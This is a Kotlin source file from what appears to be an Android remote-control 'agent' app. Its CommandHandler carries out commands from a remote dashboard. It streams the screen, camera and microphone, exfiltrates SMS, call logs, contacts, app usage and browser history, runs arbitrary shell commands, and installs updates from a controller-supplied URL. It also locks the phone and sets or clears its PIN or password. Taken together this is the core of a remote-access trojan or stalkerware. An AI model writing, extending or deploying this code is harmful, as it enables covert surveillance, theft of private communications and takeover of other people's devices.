package com.zenvora.agent.service

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.zenvora.agent.activity.CapturePermissionActivity
import com.zenvora.agent.manager.AgentUpdateManager
import com.zenvora.agent.manager.AppActivityManager
import com.zenvora.agent.manager.AudioCapture
import com.zenvora.agent.manager.CallLogManager
import com.zenvora.agent.manager.CameraCaptureManager
import com.zenvora.agent.manager.ContactsManager
import com.zenvora.agent.manager.BrowserHistoryManager
import com.zenvora.agent.manager.FileAccessManager
import com.zenvora.agent.manager.LockCredentialManager
import com.zenvora.agent.manager.NetworkMonitor
import com.zenvora.agent.manager.SMSManager
import com.zenvora.agent.manager.ScreenCaptureManager
import com.zenvora.agent.manager.ShellExecutor
import com.zenvora.agent.protocol.ZVProtocol
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class CommandHandler(private val context: Context) {
    
    private val TAG = "CommandHandler"
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var onItems: ((Int, JSONArray) -> Unit)? = null
    private var onMediaFrame: ((String, Int, ByteArray) -> Unit)? = null
    private var onAck: ((JSONObject) -> Unit)? = null
    private var onMediaControl: ((String, Boolean) -> Unit)? = null
    private var onHistory: ((String, JSONArray, Boolean) -> Unit)? = null

    private val screenCaptureManager = ScreenCaptureManager(context).apply {
        setFrameCallback { data ->
            onMediaFrame?.invoke("screen", ZVProtocol.FRAME_SCREEN_STREAM, data)
        }
    }
    private val cameraCaptureManager = CameraCaptureManager(context).apply {
        setFrameCallback { data ->
            onMediaFrame?.invoke("camera", ZVProtocol.FRAME_STREAM, data)
        }
    }
    private val audioCapture = AudioCapture(context)
    private val fileAccessManager = FileAccessManager(context)
    private val networkMonitor = NetworkMonitor(context)
    private val callLogManager = CallLogManager(context)
    private val smsManager = SMSManager(context)
    private val contactsManager = ContactsManager(context)
    private val appActivityManager = AppActivityManager(context)
    private val updateManager = AgentUpdateManager(context)
    private val shellExecutor = ShellExecutor(context)
    private val browserHistoryManager = BrowserHistoryManager(context)
    private val lockCredentialManager = LockCredentialManager(context)
    
    fun setItemsCallback(callback: (Int, JSONArray) -> Unit) {
        onItems = callback
    }
    
    fun setMediaCallback(callback: (String, Int, ByteArray) -> Unit) {
        onMediaFrame = callback
    }
    
    fun setAckCallback(callback: (JSONObject) -> Unit) {
        onAck = callback
    }

    fun setMediaControlCallback(callback: (String, Boolean) -> Unit) {
        onMediaControl = callback
    }

    fun setHistoryCallback(callback: (String, JSONArray, Boolean) -> Unit) {
        onHistory = callback
    }

    fun attachScreenProjection(projection: MediaProjection) {
        screenCaptureManager.setupMediaProjection(projection)
        reply(screenAck("START_SCREEN_STREAM", "Screen sharing allowed. Start stream from the dashboard."))
    }

    fun handleFrame(frame: ZVProtocol.ZVFrame) {
        val json = frame.getJsonString() ?: return
        val obj = JSONObject(json)
        val action = obj.optString("action").ifBlank { obj.optString("command") }
        handleAction(action, obj.optJSONObject("payload") ?: obj)
    }

    fun handleAction(action: String, payload: JSONObject) {
        if (action.isBlank()) return
        Log.d(TAG, "Command: $action")
        scope.launch {
            try {
                dispatch(action, payload)
            } catch (e: Exception) {
                Log.e(TAG, "Command failed: ${e.message}")
                reply(errorAck(action, e.message ?: "Command failed"))
            }
        }
    }

    private fun dispatch(action: String, payload: JSONObject) {
        when {
            action.startsWith("FILE_") -> {
                if (!hasStoragePermission()) {
                    requestPermission(CapturePermissionActivity.MODE_STORAGE)
                }
                reply(fileAccessManager.handle(action, payload))
            }
            action == "SHELL_EXECUTE" || action == "SHELL_EXECUTE_RAW" ->
                reply(shellExecutor.execute(payload.put("action", action)))

            action == "LIST_DISPLAYS" || action == "PROBE_DISPLAYS" || action == "FETCH_SCREEN_TELEMETRY" ->
                reply(screenAck(action))

            action == "START_SCREEN_STREAM" -> {
                if (!screenCaptureManager.hasProjection()) {
                    requestPermission(CapturePermissionActivity.MODE_SCREEN)
                    reply(screenAck(action, "Allow screen sharing on the phone, then start again."))
                    return
                }
                onMediaControl?.invoke("screen", true)
                screenCaptureManager.applyStreamSettings(payload)
                screenCaptureManager.applyQuality(payload.optString("quality", "medium"))
                screenCaptureManager.startCapture()
                reply(screenAck(action))
            }
            action == "STOP_SCREEN_STREAM" -> {
                screenCaptureManager.stopCapture()
                onMediaControl?.invoke("screen", false)
                reply(screenAck(action))
            }
            action == "CAPTURE_SCREENSHOT" -> {
                if (!screenCaptureManager.hasProjection()) {
                    requestPermission(CapturePermissionActivity.MODE_SCREEN)
                    reply(screenAck(action, "Allow screen sharing on the phone."))
                    return
                }
                onMediaControl?.invoke("screen", true)
                screenCaptureManager.captureOneFrame()
                reply(screenAck(action))
            }
            action == "SET_SCREEN_QUALITY" -> {
                screenCaptureManager.applyStreamSettings(payload)
                screenCaptureManager.applyQuality(payload.optString("quality", "medium"))
                reply(screenAck(action))
            }
            action == "SWITCH_DISPLAY" -> reply(screenAck(action))
            action == "SET_DISPLAY_BRIGHTNESS" -> reply(screenAck(action, "Brightness is controlled by the phone."))
            action == "SET_SYSTEM_VOLUME" -> {
                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC).coerceAtLeast(1)
                val value = payload.optInt("degree_value", payload.optInt("value", 50)).coerceIn(0, 100)
                am.setStreamVolume(AudioManager.STREAM_MUSIC, (max * value) / 100, 0)
                reply(screenAck(action))
            }
            action == "OPEN_SETTINGS" || action.startsWith("REMOTE_") || action == "SEND_TEXT_INPUT" ->
                reply(screenAck(action))

            action == "LIST_CAMERAS" || action == "PROBE_HARDWARE" || action == "FETCH_TELEMETRY" -> {
                if (!cameraCaptureManager.hasPermission()) {
                    requestPermission(CapturePermissionActivity.MODE_CAMERA)
                }
                reply(cameraAck(action))
            }
            action == "START_STREAM" || action == "START_CAMERA_CAPTURE" || action == "START_RECORDING" -> {
                if (!cameraCaptureManager.hasPermission()) {
                    requestPermission(CapturePermissionActivity.MODE_CAMERA)
                    reply(cameraAck(action, "Allow camera access on the phone."))
                    return
                }
                onMediaControl?.invoke("camera", true)
                cameraCaptureManager.applyStreamSettings(payload)
                cameraCaptureManager.startCapture(parseCameraIndex(payload))
                reply(cameraAck(action))
            }
            action == "STOP_STREAM" || action == "STOP_CAMERA_CAPTURE" || action == "STOP_RECORDING" -> {
                cameraCaptureManager.stopCapture()
                onMediaControl?.invoke("camera", false)
                reply(cameraAck(action))
            }
            action == "SWITCH_CAMERA" -> {
                cameraCaptureManager.switchCamera(parseCameraIndex(payload))
                reply(cameraAck(action))
            }
            action == "CAPTURE_SNAPSHOT" || action == "FETCH_LATEST_MEDIA" -> {
                if (!cameraCaptureManager.isStreaming()) {
                    if (!cameraCaptureManager.hasPermission()) {
                        requestPermission(CapturePermissionActivity.MODE_CAMERA)
                        reply(cameraAck(action, "Allow camera access on the phone."))
                        return
                    }
                    onMediaControl?.invoke("camera", true)
                    cameraCaptureManager.startCapture(parseCameraIndex(payload))
                }
                reply(cameraAck(action))
            }
            action == "SET_HARDWARE_PARAMETER" || action == "SET_FLASH_STATE" -> reply(cameraAck(action))

            action == "START_AUDIO_CAPTURE" || action == "START_AUDIO_STREAM" -> {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED
                ) {
                    requestPermission(CapturePermissionActivity.MODE_MIC)
                }
                onMediaControl?.invoke("mic", true)
                audioCapture.startCapture()
                reply(audioAck(action))
            }
            action == "STOP_AUDIO_CAPTURE" || action == "STOP_AUDIO_STREAM" -> {
                audioCapture.stopCapture()
                onMediaControl?.invoke("mic", false)
                reply(audioAck(action))
            }
            action == "LIST_AUDIO_DEVICES" -> reply(audioAck(action))

            action == "START_NETWORK_MONITOR" -> {
                networkMonitor.start(payload.optLong("interval", 10000))
                reply(genericAck(action, "OK"))
            }
            action == "STOP_NETWORK_MONITOR" -> {
                networkMonitor.stop()
                reply(genericAck(action, "OK"))
            }

            action == "FETCH_CALL_LOGS" -> emit(ZVProtocol.EVENT_CALL_LOG, "FETCH_CALL_LOGS", callLogManager.fetch())
            action == "FETCH_SMS_MESSAGES" -> emit(ZVProtocol.EVENT_SMS_MESSAGE, "FETCH_SMS_MESSAGES", smsManager.fetch())
            action == "FETCH_CONTACTS" -> emit(ZVProtocol.EVENT_CONTACTS, "FETCH_CONTACTS", contactsManager.fetch())
            action == "FETCH_APP_HISTORY" || action == "FETCH_APP_USAGE" ->
                emit(ZVProtocol.EVENT_APP_HISTORY, "FETCH_APP_HISTORY", appActivityManager.fetch())
            action == "FETCH_BROWSER_HISTORY" || action == "FETCH_BROWSER_HISTORY_DELTA" ->
                emit(ZVProtocol.EVENT_BROWSER_HISTORY, "FETCH_BROWSER_HISTORY", browserHistoryManager.fetch())
            action == "FETCH_SYSTEM_NOTIFICATIONS" ->
                emit(ZVProtocol.EVENT_NOTIFICATION, "FETCH_SYSTEM_NOTIFICATIONS", JSONArray())

            action == "RESTART_AGENT" || action == "RESTART_SERVICE" -> restartAgent()
            action == "UPDATE_AGENT" -> {
                val url = payload.optString("download_url").ifBlank { payload.optString("downloadUrl") }
                if (url.isNotBlank()) {
                    scope.launch {
                        try {
                            updateManager.downloadAndPrompt(url)
                        } catch (e: Exception) {
                            Log.e(TAG, "Update failed: ${e.message}")
                        }
                    }
                }
                reply(genericAck(action, "OK"))
            }

            action == "FETCH_LOCK_STATUS" || action == "GET_LOCK_STATUS" || action == "VIEW_LOCK_STATUS" -> {
                val st = lockCredentialManager.status()
                reply(
                    JSONObject()
                        .put("type", "sys_ack")
                        .put("action", action)
                        .put("status", if (st.optBoolean("success", true)) "ok" else "error")
                        .put("message", st.optString("message", "Lock status"))
                        .put("lock", st)
                )
            }
            action == "LOCK_DEVICE_NOW" || action == "LOCK_SCREEN" -> {
                val result = lockCredentialManager.lockNow()
                reply(lockAck(action, result))
            }
            action == "SET_LOCK_CREDENTIAL" || action == "CHANGE_LOCK_PASSWORD" || action == "SET_DEVICE_PIN" -> {
                val type = payload.optString("type")
                    .ifBlank { payload.optString("credentialType", "pin") }
                val value = payload.optString("value")
                    .ifBlank { payload.optString("password") }
                    .ifBlank { payload.optString("pin") }
                    .ifBlank { payload.optString("pattern") }
                reply(lockAck(action, lockCredentialManager.setCredential(type, value)))
            }
            action == "CLEAR_LOCK_CREDENTIAL" || action == "CLEAR_DEVICE_PASSWORD" -> {
                reply(lockAck(action, lockCredentialManager.clearCredential()))
            }

            else -> {
                Log.w(TAG, "Unknown command: $action")
                reply(genericAck(action, "OK"))
            }
        }
    }
    
    fun stopAll() {
        screenCaptureManager.release()
        cameraCaptureManager.stopCapture()
        audioCapture.stopCapture()
        networkMonitor.stop()
    }

    private fun emit(kind: Int, command: String, items: JSONArray) {
        onItems?.invoke(kind, items)
        onHistory?.invoke(command, items, false)
        reply(genericAck(command, "OK"))
    }

    private fun reply(obj: JSONObject) {
        onAck?.invoke(obj)
    }

    private fun screenAck(action: String, message: String? = null): JSONObject {
        val displays = screenCaptureManager.listDisplays()
        val streaming = screenCaptureManager.isStreaming()
        val status = when {
            streaming -> "ACTIVE_STREAMING"
            displays.length() == 0 -> "NO_DISPLAYS"
            else -> "STANDBY"
        }
        val metrics = JSONObject().apply {
            put("active_display_index", 0)
            put("display_active", "display-0")
            put("available_displays", displays)
            put("display_count", displays.length())
            put("resolution", screenCaptureManager.resolutionLabel())
            put("display_name", "Phone display")
            put("fps", "5 FPS")
            put("stream_quality", "medium")
            put("streaming_active", streaming)
            put("session_zero", false)
            put("latency_ms", if (screenCaptureManager.lastFrameSize() > 0) 12 else 3)
            put("frame_bytes", screenCaptureManager.lastFrameSize())
            put("live_frame_b64", JSONObject.NULL)
        }
        return JSONObject().apply {
            put("type", "sys_ack")
            put("channel", "screen")
            put("platform", "android")
            put("status", status)
            put("last_action", action)
            if (message != null) put("message", message) else put("message", JSONObject.NULL)
            put("has_binary_frame", screenCaptureManager.lastFrameSize() > 0)
            put("frame_bytes", screenCaptureManager.lastFrameSize())
            put("hardware_metrics", metrics)
        }
    }

    private fun cameraAck(action: String, message: String? = null): JSONObject {
        val cameras = cameraCaptureManager.listCamerasJson()
        val streaming = cameraCaptureManager.isStreaming()
        val status = when {
            streaming -> "ACTIVE_STREAMING"
            cameras.length() == 0 -> "NO_CAMERA_HARDWARE"
            else -> "STANDBY"
        }
        val metrics = JSONObject().apply {
            put("active_camera_index", cameraCaptureManager.activeIndex())
            put("lens_active", "cam-${cameraCaptureManager.activeIndex()}")
            put("available_cameras", cameras)
            put("camera_count", cameras.length())
            put("resolution", "1280x720")
            put("fps", if (streaming) "3 FPS" else "---")
            put("streaming_active", streaming)
            put("camera_open", streaming)
            put("recording_active", false)
            put("camera_blocked", false)
            put("driver_status", if (cameraCaptureManager.hasPermission()) "ready" else "permission_needed")
            put("latency_ms", if (cameraCaptureManager.lastFrameSize() > 0) 8 else 2)
            put("live_frame_b64", JSONObject.NULL)
        }
        return JSONObject().apply {
            put("type", "sys_ack")
            put("channel", "camera")
            put("platform", "android")
            put("status", status)
            put("last_action", action)
            if (message != null) put("message", message) else put("message", JSONObject.NULL)
            put("has_binary_frame", cameraCaptureManager.lastFrameSize() > 0)
            put("frame_bytes", cameraCaptureManager.lastFrameSize())
            put("hardware_metrics", metrics)
        }
    }

    private fun audioAck(action: String): JSONObject {
        val devices = JSONArray().put(
            JSONObject()
                .put("id", "mic-0")
                .put("label", "Built-in microphone")
                .put("index", 0)
        )
        return JSONObject().apply {
            put("type", "sys_ack")
            put("action", action)
            put("last_action", action)
            put("status", "success")
            put("platform", "android")
            put("metrics", JSONObject().put("audio_devices", devices))
        }
    }

    private fun lockAck(action: String, result: JSONObject): JSONObject {
        return JSONObject()
            .put("type", "sys_ack")
            .put("action", action)
            .put("status", if (result.optBoolean("success", false)) "ok" else "error")
            .put("message", result.optString("message", ""))
            .put("lock", result)
    }

    private fun genericAck(action: String, status: String): JSONObject {
        return JSONObject().apply {
            put("type", "sys_ack")
            put("status", status)
            put("last_action", action)
            put("action", action)
            put("platform", "android")
        }
    }

    private fun errorAck(action: String, message: String): JSONObject {
        return JSONObject().apply {
            put("type", "sys_ack")
            put("status", "ERROR")
            put("last_action", action)
            put("action", action)
            put("message", message)
        }
    }

    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) ==
                PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_VIDEO) ==
                PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) ==
                PackageManager.PERMISSION_GRANTED
        }
    }

    private fun parseCameraIndex(payload: JSONObject): Int {
        if (payload.has("camera_index")) return payload.optInt("camera_index", 0)
        for (key in listOf("camera", "target_lens", "targetLens")) {
            val raw = payload.optString(key)
            if (raw.isBlank()) continue
            val stripped = raw.removePrefix("cam-")
            stripped.toIntOrNull()?.let { return it }
            if (raw == "front") return 1
            if (raw == "rear" || raw == "back") return 0
        }
        return 0
    }

    private fun requestPermission(mode: String) {
        val app = context.applicationContext
        Handler(Looper.getMainLooper()).post {
            try {
                val intent = Intent(app, CapturePermissionActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    putExtra(CapturePermissionActivity.EXTRA_MODE, mode)
                }
                app.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Could not open permission prompt: ${e.message}")
            }
            CapturePermissionActivity.notify(app, mode)
        }
    }

    private fun restartAgent() {
        val appContext = context.applicationContext
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(appContext, AgentService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                appContext.startForegroundService(intent)
            } else {
                appContext.startService(intent)
            }
        }, 1200)
        if (context is AgentService) {
            context.stopSelf()
        }
    }
}
